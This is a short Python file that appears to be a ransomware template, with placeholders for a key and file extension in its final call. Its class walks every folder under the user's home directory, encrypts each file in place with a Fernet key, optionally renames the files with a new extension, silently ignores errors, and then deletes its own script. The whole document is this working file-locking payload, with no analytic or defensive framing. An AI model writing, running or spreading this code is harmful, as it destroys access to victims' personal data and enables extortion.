import os
from pathlib import Path
from cryptography.fernet import Fernet

class Encrypter:
    def __init__(self,key,extension) -> None:
        self.home_dir = str(Path.home())
        self.key = key
        self.extension= extension

    def encrypt_files(self,file):
        fernet = Fernet(self.key)

        with open(file,'rb')as file_read:
            data =  file_read.read()
            file_read.close()

        with open(file,'wb') as file_write:
            encrypted_content = fernet.encrypt(data)
            file_write.write(encrypted_content)
            file_read.close()

    def change_extension(self,file,new_extension):
        extension = file.split('.')[-1]
        new_extension = f"{new_extension}."+extension
        new_name = file.replace(extension,new_extension)
        os.rename(file,new_name)

    def start(self):
        for rootdir, dirs, files in os.walk(self.home_dir):
            for subdir in dirs:
                dir = os.path.join(rootdir, subdir)
                try:
                    os.chdir(dir)
                    for files in os.listdir(dir):
                            if os.path.isfile(files) == True:
                                if "." in files:
                                    self.encrypt_files(files)
                                    if self.extension != '':
                                        self.change_extension(files,self.extension)
                except:
                    continue        
        os.remove(os.path.basename(__file__))        


Encrypter({Key},"{FileExtension}").start()        
